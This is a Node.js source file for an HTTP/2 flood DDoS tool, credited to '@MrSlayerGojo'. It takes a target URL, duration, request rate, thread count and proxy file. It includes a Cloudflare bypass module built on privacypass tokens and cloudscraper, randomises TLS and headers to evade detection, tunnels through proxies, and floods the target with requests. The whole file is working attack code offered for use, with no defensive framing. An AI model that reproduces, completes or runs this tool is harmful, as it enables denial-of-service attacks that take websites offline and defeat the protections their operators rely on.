const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const axios = require('axios');
 const cheerio = require('cheerio'); 
 const gradient = require("gradient-string")
 
 module.exports = function Cloudflare() {
    const privacypass = require('./privacypass'),
        cloudscraper = require('cloudscraper'),
        request = require('request'),
        fs = require('fs');
    var privacyPassSupport = true;
    function useNewToken() {
        privacypass(l7.target);
        console.log('[cloudflare-bypass ~ privacypass]: generated new token');
    }

    if (l7.firewall[1] == 'captcha') {
        privacyPassSupport = l7.firewall[2];
        useNewToken();
    }

    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
        var cookie = "";
        if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
            request.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res) => {
                if (!res) {
                    return false;
                }
                if (res.headers['cf-chl-bypass'] && res.headers['set-cookie']) {

                } else {
                    if (l7.firewall[1] == 'captcha') {
                        logger('[cloudflare-bypass]: The target is not supporting privacypass');
                        return false;
                    } else {
                        privacyPassSupport = false;
                    }
                }

                cookie = res.headers['set-cookie'].shift().split(';').shift();
                if (l7.firewall[1] == 'captcha' && privacyPassSupport || force && privacyPassSupport) {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        gzip: true,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'en-US;q=0.9',
                            'challenge-bypass-token': l7.privacypass,
                            "Cookie": cookie
                        }
                    }, (err, res) => {
                        if (err || !res) return false;
                        if (res.headers['set-cookie']) {
                            cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                            cloudscraper.get({
                                url: l7.target + "?_asds=" + num,
                                proxy: proxy,
                                headers: {
                                    'Connection': 'Keep-Alive',
                                    'Cache-Control': 'max-age=0',
                                    'Upgrade-Insecure-Requests': 1,
                                    'User-Agent': uagent,
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Accept-Language': 'en-US;q=0.9',
                                    "Cookie": cookie
                                }
                            }, (err, res, body) => {
                                if (err || !res || res && res.statusCode == 403) {
                                    console.warn('[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:');
                                    useNewToken();
                                    return;
                                }
                                callback(cookie);
                            });
                        } else {
                            console.log(res.statusCode, res.headers);
                            if (res.headers['cf-chl-bypass-resp']) {
                                let respHeader = res.headers['cf-chl-bypass-resp'];
                                switch (respHeader) {
                                    case '6':
                                        console.warn("[privacy-pass]: internal server connection error occurred");
                                        break;
                                    case '5':
                                        console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                        useNewToken();
                                        break;
                                    case '7':
                                        console.warn(`[privacy-pass]: server indicated a bad client request`);
                                        break;
                                    case '8':
                                        console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                        break;
                                }
                                return bypass(proxy, uagent, callback, true);
                            }
                        }
                    });
                } else {
                    cloudscraper.get({
                        url: l7.target + "?_asds=" + num,
                        proxy: proxy,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept-Language': 'en-US;q=0.9'
                        }
                    }, (err, res) => {
                        if (err || !res || !res.request.headers.cookie) {
                            if (err) {
                                if (err.name == 'CaptchaError') {
                                    return bypass(proxy, uagent, callback, true);
                                }
                            }
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                }
            });
        } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                proxy: proxy,
                headers: {
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent
                }
            }, (err, res, body) => {
                if (err) {
                    if (err.name == 'CaptchaError') {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                if (res && res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else if (res && body && res.headers.server == 'cloudflare') {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                } else {

                }
            });
        } else {
            cloudscraper.get({
                url: l7.target + "?_asds=" + num,
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US;q=0.9'
                }
            }, (err, res, body) => {
                if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
                }
                cookie = res.headers['set-cookie'].shift().split(';').shift();
                callback(cookie);
            });
        }
    }

    return bypass;
}

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(gradient.vice(`
╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝

⁣⣿⣿⡿⠋⠄⡀⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⣉⣉⣉⡉⠙⠻
⣿⣿⣇⠔⠈⣿⣿⣿⣿⡿⠛⢉⣤⣶⣾⣿⣿⣿⣿⣿⣿⣦
⣿⠃⠄⢠⣾⣿⣿⠟⢁⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠋⢠⣾⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿
⡿⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⠗⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿
⠁⣼⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⣠⣄⢰⣿⣿⣿⣿⣿⣿
⣼⣿⣿⣿⣿⣿⣿⡇⠄⢀⡴⠚⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢰⣿⣿⣿⣿⣿⡿⣿⣿⠴⠋⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⡟
⣿⣿⣿⣿⣿⣿⠃⠈⠁⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⡟⢀
⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⢶⣿⣿⣿⣿⣿⣿⣿⣿⠏⢀⣾
⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⠋⣠⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢁⣴⣿⣿⣿⠗⠄⠄⣿
⠈⠻⣿⣿⣿⣿⣿⣿⠿⠛⣉⣤⣾⣿⣿⣿⣿⣇⠠⠺⣷⣿
⣦⣄⣈⣉⣉⣉⣡⣤⣶⣿⣿⣿⣿⣿⣿⣿⠉⠁⣀⣼⣿⣿
node gojov5 <target> <duration> <request per second> <threads> <proxyfile>`));; process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ]; 
 const lang_header = ["en-US,en;q=0.9"];
 
 const encoding_header = ["gzip, deflate, br"];
 
 const control_header = ["no-cache", "max-age=0"];
 
 const refers = [
     "https://www.google.com/",
     "https://www.facebook.com/",
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "https://www.linkedin.com/"
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
 ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
        }
      } else {
        setInterval(runFlooder);
      };
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 //headers["X-Forwarded-For"] = spoofed;
 //headers["X-Forwarded-Host"] = spoofed;
 //headers["Real-IP"] = spoofed;
 headers["cache-control"] = control;
 headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 //headers["origin"] = "https://" + parsedTarget.host;
 //headers["referer"] = "https://" + parsedTarget.host;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] = accept;
 headers["user-agent"] = randstr(15);
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["TE"] = "trailers";
 //headers["Trailer"] = "Max-Forwards";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":"); 
	 //headers[":authority"] = parsedTarget.host;
         headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
         headers["origin"] = "https://" + parsedTarget.host;

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ciphers: tls.getCiphers().join(":") + cipper,
            ecdhCurve: "prime256v1:X25519",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 console.log(gradient.vice(`[!] ATTACK HAS BEEN SENT.`));
 const KillScript = () => process.exit(1);
 console.log('Method by @MrSlayerGojo')
 setTimeout(KillScript, args.time * 1000);